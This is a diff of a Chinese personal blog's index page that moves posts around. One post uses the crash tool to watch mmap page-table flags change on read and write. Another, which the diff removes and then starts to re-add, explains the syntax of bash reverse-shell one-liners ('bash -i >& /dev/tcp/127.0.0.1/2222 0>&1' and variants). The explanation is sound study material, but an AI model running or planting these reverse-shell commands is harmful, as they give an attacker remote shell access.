@@ -582,105 +582,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/" class="post-title-link" itemprop="url">借助crash工具理解linux系统的内存分配</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxbp6PGpCqzFDSToIWn05Q">Linux下访问匿名页发生的神奇“化学反应”</a>，我看完这篇文章感觉对linux的内存分配又多了一点点理解，因此也想推荐给你读下。</p>
-<p>原文提出了一个问题：向<code>mmap</code>系统调用申请的内存”读时”没有导致物理可用内存减少，但是”随后写时”发现物理可用内存减少。</p>
-<p>原作者借助”分析内核源码”的收到来剖析问题原因，最终得到结论：第一次读匿名页后，然后写匿名页，先只读方式映射到0页，然后发生写时复制，分配物理页，虚拟页以可读可写的方式映射到此物理页。</p>
-<p>我自己总结一下，就是按照时间顺序来看，当对”可读可写的vma”先读后写时，”对应的页表项”应该是：</p>
-<ul>
-<li>在第一次读之前不存在</li>
-<li>在第一次读之后，第一次写之前，映射到固定位置，此时页表属性是只读</li>
-<li>在第一次写之后，映射到实际分配的物理内存，此时页表属性是可读可写</li>
-</ul>
-<p>可能这个结论你听着还是有点绕，并且我想你可能和我一样，也不想一下子就去研究”内核源码”来理解到底是怎么回事。</p>
-<p>那怎么能搞清楚原文的问题和结论呢？我发现一个神器<code>crash</code>，实际操作一番后，我感觉文章结论其实很好理解。下面就和我一起玩一玩<code>crash</code>，理解<code>mmap</code>分配的内存到底是怎么回事，也验证一下原文的结论是否正确。</p>
-<p>crash是一个可以用来调试linux内核崩溃的工具，也可以调试正在运行中的内核。它的安装和使用都很简单，理解本篇文章也不需要你之前接触过这个工具。</p>
-<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ul>
-<li><p>准备源码</p>
-<p>我们在”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻分别调用<code>getchar()</code>停顿一下，方便我们用<code>crash</code>工具观察”页表项”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp tmp]# cat e.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  char* addr &#x3D; mmap (NULL, 1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS , - 1 , 0);</span><br><span class="line"></span><br><span class="line">  printf (&quot;addr: %lu pid:%d\n&quot;, addr, getpid()); &#x2F;&#x2F; 在读内存之前：页表项不存在</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  printf (&quot;1:%s \n&quot;, addr);	&#x2F;&#x2F; 在读内存之后：映射了页表,页表项属性为&quot;只读&quot;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  strcpy(addr, &quot;AAAABBBB&quot;);	&#x2F;&#x2F; 在写内存之后：页表项属性为&quot;可读可写&quot;</span><br><span class="line"></span><br><span class="line">  printf (&quot;2:%s \n&quot;, addr);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面的c程序编译运行后，我们就可以来分析”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻的”页表项”是什么了。</p>
-</li>
-<li><p>使用<code>crash</code>分析”页表项”的变化</p>
-<p>首先简单说一下crash的安装和使用。</p>
-<p>如果你是centos系统，就可以用以下命令来安装</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install crash  &#x2F;&#x2F; 安装crash工具</span><br><span class="line">debuginfo-install kernel-debuginfo-&#96;uname -r&#96;  &#x2F;&#x2F; 安装crash工具需要的内核文件</span><br></pre></td></tr></table></figure>
-
-<p>安装好后，使用下面的命令就可以调试”运行中的内核了”。vmlinux是带调试符号的内核文件。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# crash &#x2F;usr&#x2F;lib&#x2F;debug&#x2F;usr&#x2F;lib&#x2F;modules&#x2F;3.10.0-1160.11.1.el7.x86_64&#x2F;vmlinux &#x2F;dev&#x2F;mem</span><br></pre></td></tr></table></figure>
-
-<p>下面来看一下”页表项”的变化：我在程序三次<code>getchar()</code>时，使用<code>crash</code>的<code>vtop</code>命令查看”虚拟地址”对应的页表</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/146151529-65a92898-2a18-48a5-958f-5076d5d94442.png" alt="image"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">crash&gt; set 31880    &#x2F;&#x2F; 31880是进程号</span><br><span class="line">    PID: 31880</span><br><span class="line">COMMAND: &quot;a.out&quot;</span><br><span class="line">   TASK: ffff9396f6a7a100  [THREAD_INFO: ffff93983cbe4000]</span><br><span class="line">    CPU: 1</span><br><span class="line">  STATE: TASK_INTERRUPTIBLE</span><br><span class="line">crash&gt; px 139812061335552  &#x2F;&#x2F; 十进制转成十六进制。139812061335552是mmap的返回值</span><br><span class="line">$1 &#x3D; 0x7f2888405000</span><br><span class="line">crash&gt; vtop 0x7f2888405000  &#x2F;&#x2F; vtop指令用来查看&quot;虚拟地址&quot;对应的&quot;物理地址&quot;</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  (not mapped)  &#x2F;&#x2F; 这里可以看出来，此时没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">   PGD: 16abd67f0 &#x3D;&gt; 16b7d7067</span><br><span class="line">   PUD: 16b7d7510 &#x3D;&gt; 170f95067</span><br><span class="line">   PMD: 170f95210 &#x3D;&gt; 160fd5067</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 0      &#x2F;&#x2F; &quot;页表项&quot;为0，其中的P标志位为0，表示&quot;页表项&quot;不存在，没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  117d65000</span><br><span class="line">....</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 8000000117d65225</span><br><span class="line">  PAGE: 117d65000</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">8000000117d65225  117d65000  (PRESENT|USER|ACCESSED|NX)   &#x2F;&#x2F; 此时&quot;页表项&quot;有了映射关系，说明此时只能读不能写</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">80000003b0cf5867  3b0cf5000  (PRESENT|RW|USER|ACCESSED|DIRTY|NX)    &#x2F;&#x2F; RW标志表明此时可以写</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>如上面指令结果中的注释：执行三次vtop指令时，页表项(PTE)中的”FLAGS”都不断变化，读写权限确实像”问题背景”中那样变化。可以看出来，结论是没有问题的</p>
-<p>怎么样，crash验证这个结论是不是很简单？</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>crash很好用，如果你想了解更多crash工具的应用场景，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/040W19-CPF0VnUvwFSKiXw">解决Linux内核问题实用技巧之 - Crash工具结合/dev/mem任意修改内存</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%85%A8%E6%B5%81%E9%87%8F%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -814,7 +715,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -827,7 +728,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
+          <a href="/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/" class="post-title-link" itemprop="url">借助crash工具理解linux系统的内存分配</a>
         </h2>
 
         <div class="post-meta-container">
@@ -851,63 +752,42 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
-<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>-i 参数</p>
-<p>  生成交互式shell</p>
-</li>
-<li><p><code>&gt;&amp;</code> 是什么？</p>
-<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxbp6PGpCqzFDSToIWn05Q">Linux下访问匿名页发生的神奇“化学反应”</a>，我看完这篇文章感觉对linux的内存分配又多了一点点理解，因此也想推荐给你读下。</p>
+<p>原文提出了一个问题：向<code>mmap</code>系统调用申请的内存”读时”没有导致物理可用内存减少，但是”随后写时”发现物理可用内存减少。</p>
+<p>原作者借助”分析内核源码”的收到来剖析问题原因，最终得到结论：第一次读匿名页后，然后写匿名页，先只读方式映射到0页，然后发生写时复制，分配物理页，虚拟页以可读可写的方式映射到此物理页。</p>
+<p>我自己总结一下，就是按照时间顺序来看，当对”可读可写的vma”先读后写时，”对应的页表项”应该是：</p>
 <ul>
-<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
-</li>
-<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
-<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
-<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
-</li>
+<li>在第一次读之前不存在</li>
+<li>在第一次读之后，第一次写之前，映射到固定位置，此时页表属性是只读</li>
+<li>在第一次写之后，映射到实际分配的物理内存，此时页表属性是可读可写</li>
 </ul>
-</li>
-<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
-<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
-<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
-<p>  更详细的可以看参考资料</p>
-</li>
-<li><p><code>0&gt;&amp;1</code> 是什么？</p>
-<p>  将标准输入重定向到标准输出</p>
-</li>
-<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
-<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
-</li>
-</ul>
-<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
-<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
-<li><p>验证<code>&gt;&amp;</code>语法</p>
-<p> <code>&amp;&gt;</code>是一种特殊情况</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
-<li><p>验证 文件描述符指向 socket</p>
-<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
+<p>可能这个结论你听着还是有点绕，并且我想你可能和我一样，也不想一下子就去研究”内核源码”来理解到底是怎么回事。</p>
+<p>那怎么能搞清楚原文的问题和结论呢？我发现一个神器<code>crash</code>，实际操作一番后，我感觉文章结论其实很好理解。下面就和我一起玩一玩<code>crash</code>，理解<code>mmap</code>分配的内存到底是怎么回事，也验证一下原文的结论是否正确。</p>
+<p>crash是一个可以用来调试linux内核崩溃的工具，也可以调试正在运行中的内核。它的安装和使用都很简单，理解本篇文章也不需要你之前接触过这个工具。</p>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ul>
+<li><p>准备源码</p>
+<p>我们在”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻分别调用<code>getchar()</code>停顿一下，方便我们用<code>crash</code>工具观察”页表项”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp tmp]# cat e.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  char* addr &#x3D; mmap (NULL, 1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS , - 1 , 0);</span><br><span class="line"></span><br><span class="line">  printf (&quot;addr: %lu pid:%d\n&quot;, addr, getpid()); &#x2F;&#x2F; 在读内存之前：页表项不存在</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  printf (&quot;1:%s \n&quot;, addr);	&#x2F;&#x2F; 在读内存之后：映射了页表,页表项属性为&quot;只读&quot;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  strcpy(addr, &quot;AAAABBBB&quot;);	&#x2F;&#x2F; 在写内存之后：页表项属性为&quot;可读可写&quot;</span><br><span class="line"></span><br><span class="line">  printf (&quot;2:%s \n&quot;, addr);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
-<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
-<p> 比如下面命令反弹shell会有些问题</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p> 而下面命令可以反弹shell</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
-
+<p>上面的c程序编译运行后，我们就可以来分析”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻的”页表项”是什么了。</p>
 </li>
-</ol>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
-<ul>
-<li>“&gt;&amp;”的两种用法</li>
-<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
+<li><p>使用<code>crash</code>分析”页表项”的变化</p>
+<p>首先简单说一下crash的安装和使用。</p>
+<p>如果你是centos系统，就可以用以下命令来安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install crash  &#x2F;&#x2F; 安装crash工具</span><br><span class="line">debuginfo-install kernel-debuginfo-&#96;uname -r&#96;  &#x2F;&#x2F; 安装crash工具需要的内核文件</span><br></pre></td></tr></table></figure>
+
+<p>安装好后，使用下面的命令就可以调试”运行中的内核了”。vmlinux是带调试符号的内核文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# crash &#x2F;usr&#x2F;lib&#x2F;debug&#x2F;usr&#x2F;lib&#x2F;modules&#x2F;3.10.0-1160.11.1.el7.x86_64&#x2F;vmlinux &#x2F;dev&#x2F;mem</span><br></pre></td></tr></table></figure>
+
+<p>下面来看一下”页表项”的变化：我在程序三次<code>getchar()</code>时，使用<code>crash</code>的<code>vtop</code>命令查看”虚拟地址”对应的页表</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/146151529-65a92898-2a18-48a5-958f-5076d5d94442.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">crash&gt; set 31880    &#x2F;&#x2F; 31880是进程号</span><br><span class="line">    PID: 31880</span><br><span class="line">COMMAND: &quot;a.out&quot;</span><br><span class="line">   TASK: ffff9396f6a7a100  [THREAD_INFO: ffff93983cbe4000]</span><br><span class="line">    CPU: 1</span><br><span class="line">  STATE: TASK_INTERRUPTIBLE</span><br><span class="line">crash&gt; px 139812061335552  &#x2F;&#x2F; 十进制转成十六进制。139812061335552是mmap的返回值</span><br><span class="line">$1 &#x3D; 0x7f2888405000</span><br><span class="line">crash&gt; vtop 0x7f2888405000  &#x2F;&#x2F; vtop指令用来查看&quot;虚拟地址&quot;对应的&quot;物理地址&quot;</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  (not mapped)  &#x2F;&#x2F; 这里可以看出来，此时没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">   PGD: 16abd67f0 &#x3D;&gt; 16b7d7067</span><br><span class="line">   PUD: 16b7d7510 &#x3D;&gt; 170f95067</span><br><span class="line">   PMD: 170f95210 &#x3D;&gt; 160fd5067</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 0      &#x2F;&#x2F; &quot;页表项&quot;为0，其中的P标志位为0，表示&quot;页表项&quot;不存在，没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  117d65000</span><br><span class="line">....</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 8000000117d65225</span><br><span class="line">  PAGE: 117d65000</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">8000000117d65225  117d65000  (PRESENT|USER|ACCESSED|NX)   &#x2F;&#x2F; 此时&quot;页表项&quot;有了映射关系，说明此时只能读不能写</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">80000003b0cf5867  3b0cf5000  (PRESENT|RW|USER|ACCESSED|DIRTY|NX)    &#x2F;&#x2F; RW标志表明此时可以写</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>如上面指令结果中的注释：执行三次vtop指令时，页表项(PTE)中的”FLAGS”都不断变化，读写权限确实像”问题背景”中那样变化。可以看出来，结论是没有问题的</p>
+<p>怎么样，crash验证这个结论是不是很简单？</p>
+</li>
 </ul>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
-</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>crash很好用，如果你想了解更多crash工具的应用场景，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/040W19-CPF0VnUvwFSKiXw">解决Linux内核问题实用技巧之 - Crash工具结合/dev/mem任意修改内存</a></p>
 
       
     </div>
@@ -1301,7 +1181,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1314,7 +1194,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/" class="post-title-link" itemprop="url">requests.get卡住</a>
+          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1338,74 +1218,224 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>之前线上的漏洞扫描遇到一个奇怪的问题:requests.get即使设置了timeout，仍然卡住。</p>
-<p>看lijiejie大佬 <a target="_blank" rel="noopener" href="http://www.lijiejie.com/requests-get-hang/">requests.get 异常hang住</a> 也碰到过这个问题。</p>
-<p>所以，我想要探究以下问题:</p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
+<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>-i 参数</p>
+<p>  生成交互式shell</p>
+</li>
+<li><p><code>&gt;&amp;</code> 是什么？</p>
